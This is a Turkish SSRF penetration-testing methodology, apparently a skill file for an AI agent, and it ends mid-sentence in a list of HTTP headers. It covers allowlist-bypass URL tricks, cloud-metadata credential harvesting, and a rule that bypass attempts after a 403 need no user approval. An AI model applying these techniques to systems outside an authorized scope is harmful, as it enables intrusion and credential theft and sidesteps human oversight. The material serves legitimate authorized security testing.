---
name: ssrf-testing
description: Server-Side Request Forgery (SSRF) tespiti, fingerprinting, context detection, protokol/hedef-özel exploitation ve raporlama için kapsamlı, tek parça test skill'i. HTTP(S), file, gopher, dict, FTP, LDAP protokol handler'ları; AWS/GCP/Azure/Alibaba/Oracle/DigitalOcean/Kubernetes cloud metadata servisleri; ve bilinen CMS/framework SSRF sink'lerini kapsar. Yalnızca yetkilendirilmiş bug bounty / pentest / CTF ortamlarında kullanılır.
---

# Server-Side Request Forgery (SSRF) — Kapsamlı Test Skill'i (Tek Parça)

## 0. Amaç, Kapsam ve Güvenlik Sınırı

### 0.1 Kapsam

**Kapsam içi:** Server-Side Request Forgery (SSRF) — tüm türleri:
**full/basic SSRF** (response'ta hedef sunucunun cevabı doğrudan
yansıtılıyor), **blind SSRF** (hiçbir yansıma yok, yalnızca OOB/timing
ile doğrulanabilir), **semi-blind SSRF** (yansıma yok ama hata mesajı/
status code/timing farkı üzerinden dolaylı sinyal alınabiliyor), ve
protokol bazlı tüm alt türler: HTTP(S) tabanlı SSRF, **dosya sistemi
protokol handler'ları** (`file://`), **binary protokol smuggling**
(`gopher://` üzerinden Redis/Memcached/SMTP/HTTP request forgery),
**diğer URL şeması handler'ları** (`dict://`, `ftp://`, `ldap://`,
`tftp://`, `sftp://`, `jar://`, `netdoc://`), ve **cloud metadata
servisi istismarı** (AWS IMDS, GCP metadata server, Azure IMDS,
Alibaba Cloud, Oracle Cloud, DigitalOcean, Kubernetes API server).

**Kapsam dışı (ama sık karışan komşu sınıflar — ayrım §3'te
detaylandırılmıştır):** **Open Redirect** (yalnızca istemciyi/
tarayıcıyı yönlendirir, sunucunun kendisi hedef URL'e istek atmaz —
§3.1), **CSRF** (Cross-Site Request Forgery — istemci/tarayıcı
kimlik bilgisiyle üçüncü taraf bir sunucuya sahte istek yaptırma,
SSRF'nin "sunucunun kendisi istek atar" modelinden temelde farklı
bir tehdit modeli — §3.2), **XXE tabanlı SSRF** (XML External Entity
işleme zincirinin bir SSRF birincil vektörü olarak kullanılması —
kapsam dışıdır çünkü kök neden ve tespit metodolojisi XML parser'a
özgüdür, ama bu skill §3.3'te bu overlap'i ve XXE skill'ine nasıl
devredileceğini açıklar), **RFI/LFI** (Remote/Local File Inclusion —
sunucunun bir dosyayı/URL'i doğrudan **kod olarak çalıştırmak**
üzere include etmesi; SSRF'nin "veri olarak getirme" modelinden
farklıdır — §3.4), **DNS rebinding** (SSRF doğrulamasını atlatmak
için kullanılan bir **teknik**tir, ayrı bir zafiyet sınıfı değildir —
bu skill'in §8.2'sinde bir bypass kategorisi olarak ele alınır, ayrı
bir üst başlık değildir).

### 0.2 Etik / Güvenlik Sınırı

Testler yalnızca yetkilendirilmiş scope içinde yapılır. **Gerçekten
gerekli olan tek sınırlar:**
- Dosya/veri **silme veya değiştirme yok**.
- **Kalıcı** sistem/konfigürasyon değişikliği **yok**.
- **Reverse shell veya kalıcı C2 yok**.
- Kasıtlı ağır **DoS yok** (özellikle internal port/network taraması
  yaparken — bkz. §9.4 sınırlı port taraması kuralı).
- Test **scope'un dışına sıçramaz** — SSRF'nin doğası gereği bir
  istek **her zaman** hedef uygulamanın bulunduğu ağdan/cloud
  hesabından çıkar; bu nedenle "scope dışına sıçrama" burada özel bir
  anlam kazanır: yalnızca **hedef uygulamanın kendi altyapısına**
  (kendi internal network'ü, kendi cloud metadata'sı, kendi internal
  servisleri) yönelik istekler kapsam içidir — üçüncü taraf bir
  sistemin (başka bir müşterinin cloud hesabı, hiç ilgisi olmayan bir
  internal IP aralığı) taranması kapsam dışıdır.

**Bunların dışında kalan her şey serbesttir** — cloud metadata
servislerinden credential/token okuma, internal servislerin banner/
versiyon bilgisini toplama, internal network topolojisini haritalama
(port taraması dahil, sınırlı ve makul kapsamda), internal admin
panellerine erişimin gösterilmesi — bunlar SSRF'nin "gerçek etkiyi
kanıtlama" gereğinin normal ve beklenen parçasıdır. Cloud metadata'dan
elde edilen bir **geçici credential'ı** (örn. AWS STS token) gerçek
API çağrılarında kullanmak (örn. `aws sts get-caller-identity` ile
kimin/hangi rolün olduğunu doğrulamak) makul bir confirmation
adımıdır; ama bu credential ile **kalıcı/yıkıcı** bir aksiyon
(kaynak silme, IAM policy değiştirme) almak §0.2'nin "kalıcı sistem
değişikliği yok" sınırını ihlal eder — token'ın **var olduğunu ve
kullanılabilir olduğunu** kanıtlamak yeterlidir.

---

## 1. Genel Metodoloji Akışı

Bu section, skill'in **zorunlu execution contract'ıdır**. Agent önce
scope'u doğrular; ardından yalnızca elde edilen sinyale göre ilgili
layer'a geçer. Aşağıdaki sıra bir "her endpoint'te her şeyi çalıştır"
checklist'i değildir.

### 1.1 Layer modeli

```text
Layer 1 — Discovery / Source / Sink
   ↓
Layer 2 — Generic SSRF Detection (protokol/hedef bilinmeden)
   ↓
Layer 3 — Context Detection (URL nereye/nasıl besleniyor)
   ↓
Layer 4 — Target/Protocol Fingerprinting (hangi ağ, hangi protokol, hangi cloud)
   ↓
Layer 5 — Confirmation (bağımsız evidence ile doğrulama)
   ↓
Layer 6 — Impact Assessment / Reporting
```

Her layer, bir öncekinden gelen **sinyale** göre dallanır — sinyal
negatifse bir sonraki aday endpoint/parametreye geçilir, aynı layer'da
tekrar tekrar denenmez (bkz. §2 Duplicate önleme).

**Layer 1'in iki paralel keşif kanalı olduğu unutulmamalı:** Layer 1
(Discovery) tek bir kanal değildir — **Application-level Discovery**
(§2, parametre/endpoint taraması) ve **Infrastructure-Mediated
Discovery** (§12.16, reverse-proxy/gateway routing testi) **paralel**
çalıştırılması gereken iki ayrı kanaldır. Application-level tarama
hiçbir aday bulamasa bile Layer 1'in "tamamlandığı" anlamına gelmez —
infrastructure kanalı ayrıca test edilmeden Layer 1 kapatılmaz.

### 1.2 Signal → Decision → Action → Result

```text
Signal:    Aday endpoint/parametre tespit edildi (§2)
Decision:  Risk skoru eşik üstünde mi? (§2 Risk skoru tablosu)
Action:    Generic detection probe'u gönder (§5)
Result:
  ├─ Outbound request evidence VAR → Context Detection'a geç (§6)
  └─ Outbound request evidence YOK →
         ├─ Blok sinyali var mı? (HTTP 403/401/406, WAF blok sayfası, vb.)
         │    ├─ EVET + SSRF ile ilişkili (bkz. §8.2 blok tespiti) →
         │    │    BYPASS pipeline'a geç (§8.2) — sonraki adaya GEÇME
         │    └─ EVET + SSRF ile ilgisiz (auth/CSRF/rate-limit) →
         │         adayı "beklemede" listesine al, sonraki adaya geç
         └─ Blok sinyali yok (gerçekten evidence yok) →
              bağlam/protokol alternatiflerini dene (§1.6 fallback),
              hepsi tükenirse sonraki adaya geç
```

**403/401 alındığında varsayılan davranış bypass denemesidir —
bu, kullanıcının açıkça onaylamasını gerektirmeyen, skill'in yerleşik
default'udur.** "Evidence yok → sonraki adaya geç" kuralı yalnızca
blok sinyali de yoksa (gerçekten sessiz/belirsiz bir negatif) geçerlidir.
Detaylı blok tespiti ve bypass sıralaması için bkz. §8.2.

Bu döngü her aday için tekrarlanır. **Karar kayıt sözleşmesi:** Agent,
her denenen (endpoint, parametre, context, payload_family,
target_hypothesis, evidence_category) 6'lısını bir state tablosunda
tutar (somut şema §2'de) — aynı kombinasyon tekrar denenmez.

### 1.3 Signal önceliği ve fail-safe

Çelişen sinyaller ortaya çıktığında öncelik şu sıradadır:
1. **OOB evidence (interactsh callback)** (§9.3) — en güvenilir, çünkü
   sunucunun gerçekten dışa istek attığını ağ seviyesinde kanıtlar.
2. **Full/reflected response evidence** (§5.1) — ikinci güvenilir,
   hedef sunucudan gelen içeriğin doğrudan görünmesi.
3. **Error-signature/status-code differential** (§7, §8.3) — üçüncü
   güvenilir, dolaylı ama tutarlı bir sinyal.
4. **Timing** (§9.4) — en zayıf, tek başına confirmed sayılmaz.

Fail-safe kural: Belirsizlik durumunda **daha düşük** classification'a
düş (`confirmed` yerine `probable`, `probable` yerine `inconclusive`) —
asla belirsiz bir sinyali "confirmed" olarak yukarı yuvarlama.

### 1.4 Hızlı Referans Tablosu

| Kategori | Delivery Mekanizması | Confirmation Zorluğu |
|---|---|---|
| Full/Basic SSRF | Hedef sunucunun cevabı response'a yansıyor | Kolay — doğrudan görülür |
| Semi-blind SSRF | Yalnızca status code/hata mesajı/timing farkı var | Orta — differential comparison gerekir |
| Blind SSRF | Hiçbir yansıma yok | Zor — yalnızca OOB (interactsh) ile confirmed olabilir |
| Protokol smuggling (gopher/dict) | Binary protokol payload'ı HTTP request içine gömülür | Zor — genelde blind, OOB veya yan etki (örn. Redis'e yazılan key) ile doğrulanır |
| Cloud metadata SSRF | `169.254.169.254` veya eşdeğeri hedeflenir | Kolay-Orta — credential/token response'ta görünürse kolay, görünmezse blind teknikleriyle |
| XXE-tabanlı SSRF | XML parser üzerinden dolaylı | XXE skill metodolojisiyle tespit edilir, bu skill yalnızca sonucu SSRF olarak sınıflandırır |

### 1.5 Payload Stage Model (P0–P6)

| Stage | Anlamı |
|---|---|
| P0 — input acceptance | Payload (URL string'inin kendisi) uygulama tarafından reddedilmeden kabul ediliyor mu (henüz hedefe hiçbir bağlantı denemesi yapılmamış olabilir — bu, P6'daki "hedeften dönen verinin saldırgana ulaşması" ile **karıştırılmamalı**, yalnızca girdinin sistem tarafından işlenmeye başlandığının kanıtıdır) |
| P1 — parsing | Uygulama URL'i "tanıyor" mu (bir URL parser'dan geçiyor mu, hata vermeden kabul ediliyor mu) |
| P2a — DNS resolution observed | Hedef hostname için bir DNS sorgusu gözlemlendi mi (interactsh'te yalnızca DNS interaction kaydı) — bu, bir TCP bağlantısının da denendiğinin kanıtı **değildir** |
| P2b — TCP connection attempt observed | Hedefe bir TCP bağlantı denemesi (SYN, timing farkı, connection-refused hatası) gözlemlendi mi — DNS aşamasından **bağımsız** olarak, hedef IP-literal olarak verilmişse DNS hiç devreye girmeden doğrudan bu aşamaya geçilebilir |
| P3 — confirmed contact | Kendi kontrolündeki (interactsh gibi) bir endpoint'e **doğrulanabilir** bir bağlantı ulaşıyor mu (yalnızca P2a/DNS-only bir kayıt bu aşamayı kısmen karşılar ama §8.4'teki koşullu kural geçerlidir; P2b + gerçek bir TCP/HTTP etkileşimi bu aşamayı tam karşılar) |
| P4 — protocol negotiation | Hedef protokolün (HTTP/gopher/dict/vb.) tam handshake'i tamamlanıyor mu |
| P5 — response capture | Hedeften dönen cevap sunucu tarafından **okunuyor** mu (blind/full ayrımı burada netleşir) |
| P6 — impact | Hedeften dönen cevap saldırgana bir şekilde **ulaşıyor** mu (doğrudan reflection, dolaylı sinyal, veya OOB exfiltration) |

### 1.6 Protokol-Seviyesi Fallback Zinciri Örneği

```text
http://<canary>.oast.fun çalışmadı (outbound bağlantı yok)
  → https:// dene (bazı whitelist'ler yalnızca http'ye izin verir,
    bazıları yalnızca https'e)
    → çalışmadı → http://<canary>.oast.fun:443/ dene (443 portuna
      HTTP — bazı port-tabanlı filtreler yalnızca port numarasına
      bakar, şema/port uyumsuzluğunu kontrol etmez)
      → çalışmadı → protocol-relative // dene (bazı parser'lar şema
        kontrolünü `//` önekiyle atlatır)
        → çalışmadı → userinfo ile dene: http://<user>:<pass>@
          <canary>.oast.fun/ (bazı allowlist'ler userinfo alanını
          hesaba katmadan yalnızca ilk göze çarpan host-benzeri
          string'i kontrol edebilir — bkz. §8.2.3)
          → çalışmadı → query-string confusion dene:
            http://<canary>.oast.fun?@expected-safe-domain.com/
            (bazı naif regex kontrolleri `?` sonrasını görmezden
            gelip yalnızca `@` öncesini host sanabilir — B8/B9 ile
            aynı aile, farklı bir sözdizimi varyantı)
            → çalışmadı → IP-literal dene (DNS çözümlemesi
              engelleniyor olabilir — bkz. §8.2 IP obfuscation
              teknikleri)
              → çalışmadı → context detection'a geri dön (§6), belki
                parametre bir URL değil bir hostname/path fragment'i
                bekliyor (örn. yalnızca `domain.com` kabul edip
                önüne sabit `https://` ekliyor olabilir)
```

### 1.7 Prerequisite Gate — Cloud Metadata/Protokol-Smuggling Payload'ları Doğrudan Ateşlenmez

Cloud metadata ve protokol smuggling (gopher/dict) payload'ları
**önkoşulsuz ateşlenmez**. Önce P2a/P2b (resolution/connection attempt) ve P3
(reachability) kanıtı elde edilir (genelde kendi kontrolündeki bir
interactsh domain'i ile), ardından hedefin **hangi ağda/cloud'da**
çalıştığı (P4 öncesi bir fingerprinting adımı, bkz. §7) makul bir
güvenle tahmin edilir — ancak o zaman ilgili cloud provider'ın (§12)
veya protokolün metadata/RCE payload'ına geçilir. Bu sıralama hem
gereksiz risk hem de "hangi cloud'da olduğunu bilmeden 6 farklı
provider'ın metadata endpoint'ini rastgele deneme" verimsizliğini
önler.

### 1.8 Oturumlar-Arası Devamlılık (Session Continuity)

Büyük bir scope (özellikle §2'deki wildcard/çoklu-host senaryosu)
tek bir konuşma oturumunda bitmeyebilir. Bu skill'in tüm state
tabloları (`probe_identity`/`probe_result`, host-triage skorları,
fingerprint hipotezleri, evidence kayıtları) **varsayılan olarak
yalnızca o anki oturumun belleğinde** tutulur — bir sonraki oturumda
bu bilgi kaybolur, **meğer ki açıkça kalıcı bir dosyaya yazılmış
olsun**. Bu bölüm, oturumlar arası devamlılığı nasıl sağlayacağını
tanımlar.

**1. Kalıcı state artifact'i — ne zaman ve nereye yazılır:** Scope
büyük görünüyorsa (tek oturumda bitmeyecek kadar çok host/parametre
varsa) veya kullanıcı açıkça "bunu birkaç oturuma bölelim" derse,
agent test oturumunun **erken bir noktasında** bir state dosyası
oluşturur (örn. `ssrf-engagement-state.json`, çalışma dizininde) ve
bu dosyayı **düzenli aralıklarla** (her yeni confirmed/probable
bulgu, her tamamlanan host, veya her birkaç probe'da bir) günceller.
Dosya şu bileşenleri içerir:

```json
{
  "scope": "*.example.com",
  "last_updated": "<zaman damgası>",
  "hosts": {
    "app1.example.com": {"status": "completed", "score": 8, "findings": [...]},
    "app2.example.com": {"status": "in-progress", "score": 6},
    "admin.example.com": {"status": "pending", "score": 9},
    "...": "..."
  },
  "probe_identities_tested": ["<probe_identity kayıtları, §2>"],
  "host_groups": {"sibling-group-1": ["app1...", "app2..."]},
  "pending_oob": ["<gönderilmiş ama henüz interactsh log'unda karşılığı görülmemiş canary'ler ve gönderilme zamanları>"],
  "confirmed_findings": ["<§14.1 formatında özet kayıtlar>"],
  "interactsh_domain_used": "<önceki oturumdaki canary domain, varsa>"
}
```

Bu şema bir zorunluluk değil, bir **öneridir** — agent, mevcut
ortamının araçlarına göre (bir not defteri, bir dosya, bir todo-list
mekanizması) en uygun kalıcı depolama şeklini seçer; önemli olan
şema değil, **hangi bilgilerin** kalıcı tutulması gerektiğidir.

**2. Yeni oturumun başındaki prosedür:** Bir oturum, önceki bir
engagement'a devam ediyorsa (kullanıcı bunu belirtir veya agent
çalışma dizininde bir state dosyası bulur):
```
1. State dosyasını oku
2. `last_updated` zaman damgasına bak — uzun bir süre geçtiyse
   (örn. birkaç gün+), hedefin davranışının DEĞİŞMİŞ olabileceğini
   varsay (patch, config değişikliği, WAF güncellemesi) — devam
   etmeden önce 1-2 baseline probe ile (§5) hedefin hâlâ aynı
   şekilde davrandığını hızlıca doğrula
3. `hosts` listesinde `status: pending`/`in-progress` olanlardan
   devam et — `completed` olanları TEKRARLAMA (bu, §2'deki duplicate
   önleme ilkesinin oturumlar arası uzantısıdır)
4. `pending_oob` listesindeki canary'leri kontrol et (bkz. madde 3)
5. Kaldığı yerden devam et, host-skoruna göre sıralamayı koru
```

**2b. Ortama göre uygulama farkı (KRİTİK — mekanizma araçtan bağımsız
ama ortamın kalıcı dosya sistemi olup olmadığına bağlıdır):**
- **Claude Code, aynı dizinde konuşma geçmişini geri yükleyen bir
  komutla (`--resume`/`--continue` gibi) devam ediliyorsa:** Agent
  zaten önceki konuşmayı hatırlar, state dosyası ek bir güvence/
  checkpoint görevi görür (özellikle çok uzun engagement'larda
  konuşma geçmişi budanmışsa faydalıdır) — dosya yine de okunmalı,
  ama bu senaryoda kritik değildir.
- **Claude Code, konuşma geçmişi geri yüklenmeden aynı dizinde
  yeniden başlatılıyorsa:** Agent'ın **hiçbir** konuşma hafızası
  yoktur — devamlılığın **tamamı** state dosyasına dayanır. Bu
  senaryoda, yeni oturumun başında agent'a açıkça "bu dizinde bir
  engagement state dosyası var mı kontrol et, varsa oradan devam et"
  talimatının verilmesi (veya bir proje talimat dosyasına
  bu kuralın yazılması) gerekir — dosya diskte durur ama agent
  kendiliğinden aramaz, bu adımın tetiklenmesi gerekir.
- **claude.ai (web/mobil arayüz, dosya sistemi kalıcı DEĞİL, her
  konuşma kendi geçici ortamında çalışır):** State dosyası bir
  konuşmadan diğerine **otomatik taşınmaz**. Devam etmek isteniyorsa
  dosyanın (§14'teki `present_files` ile üretilen çıktı gibi)
  **indirilip yeni konuşmaya tekrar yüklenmesi** gerekir.

**3. interactsh-client discontinuity — KRİTİK ve kolay gözden kaçan
bir nokta:** Önceki oturumda başlatılan `interactsh-client` süreci,
oturum bittiğinde muhtemelen **sonlanmıştır** — yeni oturumda
başlatılan bir `interactsh-client` **yeni bir canary domain**
üretir, eskisi değil. Bu, iki önemli sonuç doğurur:
- Önceki oturumdaki `pending_oob` listesindeki canary'lere gelecek
  olan gecikmeli bir OOB ping'i (örn. stored/indirect bir SSRF'in
  saatler sonra tetiklenmesi), **yeni oturumda artık asla
  görülemez** — eski canary domain'i dinleyen süreç artık çalışmıyor.
- **Fail-safe kural (KRİTİK — false negative'i önler):** Bu durumdaki
  bir stored/indirect aday, "test edildi, negatif" olarak
  **işaretlenmez** — `inconclusive/lost-due-to-session-gap` olarak
  işaretlenir ve **yeni bir canary ile yeniden test edilir**. Eski
  bir OOB sonucunun kaybolmuş olması hiçbir zaman "confirmed" bir
  bulguyu geçersiz kılmaz (zaten confirmed olan bir bulgu için bu
  sorun yoktur), ama henüz **beklemede** olan (yanıt bekleyen) bir
  aday için "sessizlik = negatif" varsayımı yapılmaz.
- Eğer engagement'ın uzun sürebileceği **baştan** biliniyorsa, tercih
  edilen yaklaşım `interactsh-client`'ı bir arka plan sürecinde
  (örn. `nohup`/`screen`/`tmux` ile, veya kalıcı bir sunucuda) uzun
  süre canlı tutmaktır — bu, aynı canary domain'in birden fazla
  oturum boyunca geçerli kalmasını sağlar ve yukarıdaki kayıp
  riskini tamamen ortadan kaldırır. Bu mümkün değilse (ortam her
  oturumda sıfırlanıyorsa), yukarıdaki fail-safe kural uygulanır.

**4. Genel ilke (bu bölümün özeti):** Oturumlar arası devamlılık,
**verimlilik** içindir (aynı işi tekrar yapmamak) — asla **kapsam
daraltma** aracı olarak kullanılmaz. Durum belirsizse (bir host'un
gerçekten tam test edilip edilmediği net değilse, bir OOB sonucunun
kaybolup kaybolmadığı belirsizse), varsayılan davranış **yeniden
test etmektir**, "muhtemelen zaten yapılmıştır" varsayımıyla
atlamak değil.

---

## 2. Discovery & Risk Scoring

### Endpoint/parametre adayları nereden çıkarılır
- Recon sonuçları: canlı host listesi, JS bundle'ları, OpenAPI/Swagger,
  GraphQL introspection, Burp/proxy history.
- Teknoloji fingerprint (framework/CMS tespiti) → §13'teki
  Framework→sink tablosuyla eşleştirilerek hangi endpoint'lerin
  bilinen SSRF sink'i taşıdığı önceden daraltılır (bu eşleme
  **varsayılan**dır, kesin değildir).

### Yüksek öncelikli endpoint kategorileri (azalan risk sırası)
1. **URL/link önizleme ve "unfurl" özellikleri** — sosyal paylaşım
   kartı üretimi, mesajlaşma uygulamalarında link preview, "URL'den
   içe aktar" özellikleri. SSRF'nin **klasik ve en yaygın** sink'i.
2. **Webhook/callback URL kayıt mekanizmaları** — kullanıcının kendi
   webhook URL'ini tanımlayabildiği entegrasyon ayarları (uygulama bu
   URL'e periyodik/tetiklenmeli istek atar).
3. **Dosya/resim/PDF işleme — "URL'den yükle" özellikleri** — profil
   fotoğrafı/logo/avatar'ı bir URL'den çekme, PDF/rapor üretiminde
   harici bir sayfayı/resmi dahil etme (`wkhtmltopdf`, headless
   Chrome/Puppeteer tabanlı render motorları).
4. **Web crawler/scraper/screenshot servisleri** — "bu URL'in
   ekran görüntüsünü al" veya "bu sayfayı tara/indeksle" özelliği
   sunan araçlar (SEO analiz araçları, arşivleme servisleri, sosyal
   medya zamanlama araçlarının "önizleme" özelliği) — bu servisler
   **tasarım gereği** kullanıcı tanımlı bir URL'e istek atar,
   dolayısıyla §6.1'deki "kasıtlı özellik" kategorisine girer; asıl
   soru genelde hedef kısıtlamasının (internal IP/localhost'a
   erişimin engellenip engellenmediği) doğru uygulanıp
   uygulanmadığıdır.
5. **XML/döküman işleme (XXE-SSRF overlap)** — SVG/DOCX/PDF/RSS/
   SOAP gibi XML tabanlı formatların import/parse edildiği
   endpoint'ler (bkz. §3.3).
6. **API entegrasyon/proxy endpoint'leri** — bir "veri kaynağı URL'i"
   veya "API endpoint" tanımlayan admin panelleri (özellikle
   monitoring/dashboard araçlarında — Grafana tarzı "data source"
   tanımlama klasik bir örnektir).
7. **OAuth/SAML/OIDC metadata URL alanları ve redirect/callback
   parametreleri** — "Identity Provider metadata URL'i" gibi bir
   federasyon/SSO konfigürasyon alanı, ayrıca `redirect_uri`/
   `return_url`/`next`/`continue` gibi post-authentication yönlendirme
   parametreleri (bazı sunucu tarafı OAuth implementasyonları, bu
   parametreyi yalnızca tarayıcıya yönlendirmekle kalmaz, geçerliliğini
   doğrulamak için **sunucu tarafında da** bir istek atabilir).
8. **PDF export / rapor üretimi / e-posta şablonu render'ı** — sunucu
   tarafında HTML'i render edip resim/PDF'e çeviren özellikler.
9. **Import/senkronizasyon özellikleri** — "bir URL'den/feed'den içe
   aktar" (RSS/Atom feed okuyucuları, "CSV'yi bir URL'den yükle").
10. **Repository/paket/API-spec içe aktarma özellikleri** — "bir Git
    reposunu/paket kaydını/OpenAPI-Swagger spesifikasyonunu URL'den
    içe aktar" özelliği (CI/CD araçları, paket yöneticisi arayüzleri,
    API dokümantasyon/test araçları) — modern geliştirici araçlarında
    giderek yaygınlaşan, sıkça atlanan bir sink kategorisi.
11. **Video/medya transcoding servisleri** — bir video/medya dosyasını
    uzak bir URL'den indirip işleyen servisler.
12. **DNS/network yardımcı araçları** — "ping"/"traceroute"/"whois"/
    "port kontrolü" gibi meşru ağ araçları sunan admin panelleri
    (genelde **doğrudan** ve **kasıtlı** bir SSRF-benzeri özelliktir,
    yetkilendirme sınırı test edilmelidir).
13. **PDF/döküman imzalama, harici doğrulama servisleri** — "belge
    doğrulama URL'i" gibi harici bir servise referans veren alanlar.
14. **İnfra servis entegrasyon konfigürasyonu + "bağlantıyı test et"
    özelliği — YÜKSEK DEĞERLİ, sık atlanan bir kategori:** Kurumsal
    SaaS/admin panellerinde bir harici servisi (SMTP relay, LDAP
    dizini, Redis/Memcached cache, Elasticsearch cluster'ı, S3-uyumlu
    özel depolama endpoint'i, mesaj kuyruğu) yapılandırmaya yarayan
    ve genelde yanında **"Test Connection"/"Bağlantıyı Doğrula"**
    butonu bulunan formlar. Bu buton, sunucunun kullanıcı tanımlı
    host:port'a **gerçek bir TCP/protokol seviyesi bağlantı**
    denemesi yapmasına yol açar — bu, klasik bir SSRF sink'idir ve
    genelde §12.4'teki (dict://) port-probe kapasitesiyle doğrudan
    örtüşür (bazı durumlarda gopher ile protokol smuggling'e bile
    zincirlenebilir, örn. LDAP/SMTP alanına gopher payload'ı
    denenmesi). Bu kategori diğerlerinden farklıdır çünkü sink genelde
    bir `url` parametresi değil, **ayrı host + port (+ opsiyonel
    protokol) alanlarının kombinasyonudur** — bkz. aşağıdaki parametre
    listesi.

### Yüksek öncelikli parametre adları

**URL/adres çekirdek adları (genel):**
`url`, `uri`, `link`, `href`, `src`, `source`, `target`, `dest`,
`destination`, `redirect`, `callback`, `webhook`, `endpoint`,
`host`, `hostname`, `domain`, `server`, `path`, `file`, `document`,
`resource`, `fetch`, `load`, `import`, `feed`, `proxy`, `remote`,
`origin`, `forward`, `connect`, `connection`

**OAuth/SSO/post-action redirect'e özgü (klasik ve çok yaygın bir
alt kategori — bu isimler genelde bir "redirect" değil, tam bir
outbound istek olarak da işlenebilir, özellikle server-side OAuth
callback doğrulaması yapan akışlarda):**
`redirect_uri` (OAuth2 spesifikasyonunun standart parametre adı),
`return_url`, `return_uri`, `return_to`, `returnUrl`, `next`,
`continue`, `service` (CAS protokolüne özgü), `success_url`,
`failure_url`, `client_url`

**Önizleme/render/import'a özgü:**
`preview_url`, `image_url`, `avatar_url`, `logo_url`, `icon_url`,
`thumbnail`, `snapshot`, `render_url`, `pdf_url`, `report_url`,
`template_url`, `html_url`, `screenshot_url`, `og_image` (Open Graph
image — link unfurling özelliklerinde çok yaygın), `oembed_url`
(oEmbed standardı — bilinen bir SSRF vektörü)

**Webhook/entegrasyon'a özgü:**
`webhook_url`, `notify_url`, `notification_url`, `callback_url`,
`hook`, `subscription_url`, `ping_url`, `data_source_url`,
`connection_string`, `connection_url`, `api_endpoint`, `api_url`,
`service_url`, `base_url`, `metadata_url`, `discovery_url`
(OIDC discovery), `validation_url`, `verification_url` (domain/webhook
sahiplik doğrulama akışları — SSRF için klasik bir sink deseni)

**İçe/dışa aktarma, dosya ve repository'e özgü (yüksek değerli, sık
atlanan bir alt kategori):**
`download_url`, `export_url`, `attachment_url`, `media_url`,
`rss_url`, `atom_url`, `repository_url`, `git_url`, `package_url`
(bir "git/paket reposunu URL'den içe aktar" özelliği — CI/CD ve
paket yöneticisi entegrasyonlarında yaygın), `manifest_url` (web app
manifest/PWA fetcher'ları), `wsdl_url` (SOAP/WSDL fetcher'ları —
hem SSRF hem XXE overlap riski taşır, bkz. §3.3), `swagger_url` /
`openapi_url` (API spesifikasyonunu bir URL'den içe aktarma —
modern API test/dokümantasyon araçlarında sık görülen bir özellik),
`upload_url` (yüklenen bir dosyanın nereye "yönlendirileceğini"
belirten alan — bazı depolama entegrasyonlarında), `helm_chart_url`
/ `chart_repo_url` (Helm chart repository — Kubernetes tabanlı
araçlarda), `terraform_module_source` / `module_source` (IaC modül
kaynağı — bazı IaC otomasyon platformlarında kullanıcı tanımlı bir
modül URL'i çekilir), `dockerfile_url` (uzak bir Dockerfile/build
context çekimi), `sitemap_url`, `robots_url` (SEO/crawler araçlarına
özgü, `crawl_url` ailesiyle aynı kategori)

**Medya/streaming'e özgü (video/medya transcoding kategorisinin somut
parametre karşılıkları — bkz. §2 kategori 11):**
`stream_url`, `video_url`, `hls_url`, `m3u8_url` (HLS manifest
URL'i — dikkat: bir HLS/DASH manifest'inin **içeriği** de başka
harici URL'ler referans edebilir, bu durumda tek bir parametre iki
aşamalı bir SSRF zincirine yol açabilir: manifest URL'i → manifest
içeriğindeki segment/alt-manifest URL'leri)

**İnfra servis konfigürasyonu + "bağlantıyı test et" deseni (§2
kategori 14 — yüksek değerli, host+port kombinasyonu şeklinde farklı
bir context'tir, tek bir `url` parametresi değildir):**
`smtp_host` / `smtp_server` / `mail_server` (SMTP relay
yapılandırması), `ldap_url` / `ldap_server` (dizin servisi
yapılandırması — LDAP injection ile de kesişebilir, ayrı bir
zafiyet sınıfı), `redis_url` / `redis_host` (cache/queue backend
yapılandırması), `elasticsearch_url` / `es_url` (arama motoru
backend'i), `s3_endpoint` / `storage_endpoint` (S3-uyumlu özel
depolama endpoint'i — MinIO tarzı entegrasyonlarda yaygın),
`database_host` / `db_host` (bazı "bağlantıyı test et" özellikleri
burada da gerçek bir TCP handshake denemesi yapar, SQL injection'dan
tamamen ayrı bir SSRF yüzeyi), `queue_url` / `broker_url` (mesaj
kuyruğu backend'i), `proxy_pac_url` (Proxy Auto-Config dosyası
URL'i — hem tarayıcı hem bazı sunucu tarafı HTTP client'ları PAC
dosyalarını fetch edip yorumlayabilir)

**Web crawler/scraper/screenshot servislerine özgü (§2'deki
"URL'den içerik çek" kategorisinin somut parametre karşılıkları):**
`crawl_url`, `scrape_url`, `screenshot_url`, `render_target`

**Ağ aracı/admin panel'e özgü:**
`ip`, `port`, `address`, `host_check`, `ping_target`, `probe_url`,
`healthcheck_url`, `proxy_host`, `proxy_port`, `proxy_url`

**Header-tabanlı SSRF vektörleri (KRİTİK — ayrı bir delivery
mekanizması, yalnızca query/body parametre taraması bunları
YAKALAMAZ; bkz. §6 header-value context, §11 reverse-proxy header
injection):** Yukarıdaki tüm isimler query/body/JSON parametreleri
içindir — ama bazı SSRF sink'leri **parametre değil, HTTP header**
üzerinden tetiklenir. **Düzeltme — bu bir "her endpoint'te körlemesine
dene" listesi değildir, sinyal-güdümlü bir listedir:** Bu header'ları
denemek için önce şu sinyallerden birinin varlığı aranmalı —
response'ta bir header değerinin **yansıması/kullanılması** (örn.
oluşturulan bir callback/redirect URL'inde `X-Forwarded-Host`
değerinin göründüğü), hedefin bir reverse-proxy/gateway mimarisi
olduğu (§12.16), veya hedefin bir "URL doğrulama"/routing mantığı
sergilediği (§6). Bu sinyallerden biri yoksa, bu header'ları her
endpoint'te tekrar tekrar denemek düşük getirili bir request
harcamasıdır — request bütçesi (§10.6) daha yüksek öncelikli
adaylara ayrılmalıdır. Sinyal varsa deneme listesi:
`X-Forwarded-Host`, `X-Forwarded-For`, `X-Forwarded-Server`,
`X-Original-URL`, `X-Rewrite-URL`, `X-Host`, `Forwarded` (RFC 7239
standardı, `X-Forwarded-*` ailesinin standart karşılığı). **Daha
düşük öncelikli/koşullu header'lar (yalnızca özel bir zincir
gözlemlenirse anlamlı):** `X-Forwarded-Proto` (yalnızca uygulama bu
değeri bir callback/redirect URL'i **oluşturmak** için kullanıyorsa
anlamlıdır — kendi başına bir SSRF sink'i değildir, `scheme`
reconstruction/canonical URL üretimi için kullanılan bir yardımcı
değerdir), `X-Real-IP` (bazı routing/rate-limit mantıklarında hedef
seçimini etkileyebilir), `Referer`/`Origin` (yalnızca sunucu tarafı
